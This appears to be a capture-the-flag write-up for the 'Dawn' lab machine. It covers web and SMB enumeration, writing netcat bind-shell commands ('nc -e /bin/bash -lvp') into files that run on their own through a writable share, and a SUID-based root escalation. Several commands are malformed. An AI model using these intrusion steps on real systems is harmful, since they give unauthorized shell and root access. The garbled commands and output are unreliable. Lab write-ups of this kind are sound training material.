Weee, *http* port is running let run ***gobuster***
>**gobuster  dir -u  http://192.168.222.11/ -w /home/harishankar/wordlist/ .txt**

**/logs/**  directory is available 
let look into it

![Logs](/assets/img/Dwan/Screenshot%20from%202023-08-09%2022-09-19.jpg)
    Log file exposed 

In that we can see that a file has excution permision **web-Control**  and **product-Control** with so let see on other side smbclient 
Doing more enumeration


****Enum4Linux****  
It Finds that smb runs with shared **ITDEPT** work Grp 
let connet through smbclient
 >smbclient //192.168.222.11/ITDEPT
 
 ![smbclient](/assets/img/Dwan/Screenshot%20from%202023-08-09%2022-12-56.png) 

## Intial Access 
 um empty , we know that product-control and web-control file with execution 

 let add file into this 
 ```
 echo "nc-e /bin/bash/-lvp 1234&" > product-control

 echo "nc-e /bin/bash/ -lvp 1235&" > web-control
``````

Puting the file into the machine now we essatblish the connetion 
``` 

NC 192.168.222.11 1234 

```
## privilege escalation

 SUID — It will provide special type of file permissions given to file. So If I’m an attacker once I got reverse first thing I will check SUID related files.

 ```
find / -perm -u=s -type f 2>/dev/null 
 
$whoami

$/usr/bin/zsh
 
$whoami
/root
/dawn

$cd /root
$cat flag.txt 

```
